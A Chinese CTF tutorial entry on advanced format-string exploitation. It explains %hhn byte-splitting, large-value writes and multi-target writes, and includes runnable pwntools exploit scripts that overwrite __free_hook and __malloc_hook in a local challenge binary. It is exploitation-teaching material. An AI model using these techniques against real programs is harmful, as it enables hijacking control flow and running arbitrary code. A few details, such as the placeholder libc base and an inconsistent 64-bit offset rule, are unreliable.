---
title: 格式化字符串进阶 —— %hhn 分字节写、大数值写与多目标改写链
category: pwn
tags: ["format string", "%hhn", 分字节写, 任意写, 多目标]
signals: [printf 的用户输入直接当作 format 参数, 能控制格式化字符串但写入长度有限, 程序只允许调用一次 printf, 需要写多个地址比如 hook 加 fini_array, 写入目标的地址里有 0x00 导致无法直接输出, 64 位下栈上是寄存器转存区, 需要一次性构造 6 组以上任意写]
difficulty: hard
source: "CTF-Wiki 格式化字符串利用 / pwntools fmtstr_payload"
tools: [pwntools, gdb, pwndbg, ROPgadget]
updated: 2026-10-23
---

## 一、识别信号（题面长什么样）

- `printf(buf)` / `fprintf(fp, buf)` / `syslog(msg)` 把用户输入当 format 参数。
- 已有 `format-string-arbitrary-write.md` 覆盖了**基础任意写**；本题却是：
  **只给一次 `printf` 机会**、**输出长度上限**（`read(0, buf, 0x80)`）、或需要**连续改 4~8 个地址**。
- 目标值很大（如 `system` 的绝对地址 `0x7f...`），`%n` 一次写会输出 2GB，必须 `%hhn` 拆 6~8 段。
- 64 位题目里前 6 个参数走寄存器，payload 中前 6 个 `%p` 读不到栈 —— 需要 `%8$p` 起步。
- 目标地址包含 `\x00`（如 `.bss` 的低位），`strcpy` 之后的 `printf` 会截断。
- 溢出场景：`printf` 的 format 在栈上且可被溢出覆盖，需要**用 printf 自身完成写**。

## 二、原理

### 1. `%n` 家族

| 说明符 | 写入宽度 | 长度 |
| --- | --- | --- |
| `%n` | 4 字节（32 位）/ 8 字节（64 位 `%ln` 才 8） | 危险，动辄 GB |
| `%hn` | 2 字节 | 常用 |
| `%hhn` | **1 字节** | 最灵活，大数必用 |

`%n` 写入的是「到目前为止输出的字符数」。`%hhn` 取该计数的**低 8 位**，于是把一个 8 字节大数拆成 8 个独立字节写。

### 2. 分字节写的核心思路

要写 `0x00007f8a12345678` 到 `target`：

```
target+0 : \x78    累计输出 0x78 字节
target+1 : \x56    累计输出 0x56 字节（比上一个小，靠 %hhn 自动回绕！）
target+2 : \x34
...
```

关键点：**`%hhn` 只取计数的低 8 位**，所以「变小」也不用重置计数 —— 填充量按
`(target_byte - cur) & 0xff` 计算即可，自然支持回绕。手写时按「目标字节模 256 递增」排序以缩短输出。

### 3. 地址排布

payload 结构（64 位）：

```
[addr0][addr1][addr2]... + "%<len>c%<idx>$hhn%<len2>c%<idx2>$hhn..."
                          ↑ 名字在第 idx 个参数（栈上的地址）
```

因为地址本身会占位置，所以 `idx` 要靠 `%p` 泄漏确定：

```python
io.sendline(b'%p.' * 20)     # 找到第一个出现 buf 内容的偏移
```

### 4. 多目标改写链

一次 `printf` 可以做 N 组写：`pwntools.fmtstr_payload(offset, {addr: val, ...}, write_size='byte')`
会自动排序、计算偏移、拼接地址。需要**更多空间**时用 `write_size='short'` 减少组数。

### 5. 64 位下的参数寄存器

`printf` 的第 1~6 个参数在 `rsi, rdx, rcx, r8, r9`（`rdi` 是 format 本身）。
栈上的位置从第 7 个开始，对应 `%7$p`、`%8$p`… 因此 **64 位的偏移通常 ≥ 7**。
若溢出把 payload 写到栈上，`%n$hhn` 的 `n` 通常为 `6 + 栈偏移/8`。

## 三、解题步骤

1. **确认 format 存在**
   ```bash
   strings -a ./pwn | head; objdump -d ./pwn | grep -E 'call.*printf'
   ```
2. **定位参数偏移**
   ```python
   io.sendline(b'AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p')
   # 找到 "0x4141414141414141" 出现在第几个 %p → 即 offset
   ```
3. **确认栈上 payload 落点**：`gdb` 里 `printf` 前 `x/20gx $rsp`，找 `0x41414141...` 的位置。
4. **决定写方式**：目标值 > 0xffffffff 时用 `write_size='byte'`；只写 2 字节用 `'short'`。
5. **排序**（pwntools 自动做）：按「模 256 递增」的重排能显著减少输出长度。
6. **发送并校验**：打完立刻再 `%s` 回读一次目标，确认写入正确。

## 四、可直接运行的 exp 脚本

```python
#!/usr/bin/env python3
# 一次 printf 完成 6 组任意写（64 位）· 写 __free_hook = system 等
from pwn import *

context.binary = elf = ELF('./pwn')
libc = ELF('./libc-2.31.so')
context.log_level = 'info'
context.arch = 'amd64'

io = process(elf.path)

def send_fmt(payload):
    io.sendlineafter(b'input: ', payload)
    return io.recvline()

# ---------- 1. 找参数偏移 ----------
probe = send_fmt(b'.'.join([b'%p'] * 30))
log.info(probe[:200])

# 用 cyclic 找 0x41414141 的位置，或直接读上面输出里 "0x..." 的排位
OFFSET = 8                     # 例如第 8 个参数开始是栈缓冲

# ---------- 2. 泄漏 libc（例如用 %s 读 GOT 条目） ----------
send_fmt(flat({0: elf.got['puts']}) + f'%{OFFSET + 1}$s'.encode())
libc_base = LIBC_BASE                     # 由泄漏值减去 puts 偏移得到

# ---------- 3. 构造多目标写 ----------
targets = {
    libc_base + libc.sym['__free_hook']:     libc_base + libc.sym['system'],
    libc_base + libc.sym['__malloc_hook']:   libc_base + libc.sym['realloc'] + 6,
}
# write_size='byte' 拆成单字节写，适合写大且地址多的场景
payload = fmtstr_payload(OFFSET, targets, write_size='byte')
log.info(f'payload len = {len(payload)}')

# ---------- 4. 发送（注意输入长度限制） ----------
io.sendlineafter(b'input: ', payload)
io.interactive()
```

### 手写分字节版（看清底层逻辑）

```python
from pwn import *

def byte_writes(offset, targets):
    """targets: {addr: value}，按模 256 递增排序，生成 %hhn 序列"""
    plan = []
    for addr, val in targets.items():
        for i in range(8):                       # 64 位 → 8 字节
            plan.append((addr + i, (val >> (8 * i)) & 0xFF))
    plan.sort(key=lambda t: t[1])                # 按目标字节升序

    addrs = b''.join(p64(a) for a, _ in plan)
    fmt, cur = b'', 0
    for i, (a, byte) in enumerate(plan):
        delta = (byte - cur) & 0xFF              # 模 256，天然支持"变小"
        idx = offset + i
        fmt += b'%' + str(delta).encode() + b'c%' + str(idx).encode() + b'$hhn'
        cur = byte
    return addrs + fmt, plan

# 例：把 __free_hook 指向 system
p, plan = byte_writes(OFFSET, {free_hook: system})
io.sendlineafter(b'input: ', p)
```

### 大数值 + 受限长度场景

```python
# 输入只有 0x80 字节时，地址放不下 8 个 → 分两次 printf：
# 第一次写低 4 字节（%hn），第二次写高 4 字节
fmt1 = fmtstr_payload(OFFSET, {target: (val & 0xffffffff)}, write_size='short')
fmt2 = fmtstr_payload(OFFSET, {target + 4: (val >> 32)}, write_size='short')
```

## 五、常见坑 / 变体

1. **`%n` 一次写 8 字节要输出几十亿字符**：必须 `write_size='byte'` 或 `'short'`。
2. **`\x00` 截断**：地址含 0 时 `strcpy` 会截断；把地址放在 payload **最前面**，或绕过 `strcpy` 用 `read`。
3. **64 位 offset 从 7 起**：前 6 个参数在寄存器，`%1$p` 读到的是 `rsi` 的残留。
4. **参数乱序**：`printf("...%2$s", a, b)` 中 `b` 在下一条参数位，payload 的地址位置也要同步。
5. **输出上限**：`%<len>c` 越大越慢；每个字节最大 255 字符，8 字节最多 ~2000 字符，超出 `read` 长度会被截断。
6. **`fmtstr_payload` 的 `write_size='byte'` 会增加 payload 长度**（每个地址 8 字节 + 每个写 ~14 字节），
   空间紧张时优先 `'short'`。
7. **多目标写排序**：按目标字节升序可以避免"回绕浪费"，手动实现时务必排序。
8. **变体：只读泄漏** —— 用 `%s` 读 GOT 条目，如 `fmtstr_payload` 无法完成读，需手写 `%<i>$s`。
9. **变体：`%hhn` + `malloc_hook` 部分写** —— 只改低 2 字节把 hook 指向 `one_gadget`，绕过长度限制。

## 六、参考来源

- [CTF-Wiki：格式化字符串利用](https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-exploit/)
- [CTF-Wiki：格式化字符串原理](https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/)
- [pwntools：fmtstr_payload 文档](https://docs.pwntools.com/en/stable/)
- [ir0nstone：Format String 进阶（multi-write / 偏移计算）](https://ir0nstone.gitbook.io/notes)
- [guyinatuxedo：格式化字符串例题集](https://guyinatuxedo.github.io/)
- [glibc printf(3) man page（`%n` 语义）](https://man7.org/linux/man-pages/man3/printf.3.html)
